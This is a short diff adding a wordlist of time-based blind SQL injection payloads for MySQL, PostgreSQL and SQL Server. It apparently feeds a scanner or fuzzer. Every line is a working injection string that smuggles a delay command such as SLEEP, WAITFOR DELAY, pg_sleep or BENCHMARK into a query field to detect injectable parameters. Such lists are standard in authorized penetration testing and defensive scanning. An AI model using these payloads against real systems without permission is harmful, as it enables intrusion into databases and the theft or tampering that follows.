@@ -1,0 +1,14 @@
+# Time-based blind SQL injection payloads
+' AND SLEEP(3)--
+' OR SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+1' AND SLEEP(3) AND '1'='1
+" AND SLEEP(3)--
+' OR (SELECT SLEEP(3))--
+'; SELECT pg_sleep(3)--
+' AND pg_sleep(3)--
+' || pg_sleep(3)--
+1 AND SLEEP(3)
+1; WAITFOR DELAY '0:0:3'--
+' AND BENCHMARK(5000000,SHA1('test'))--
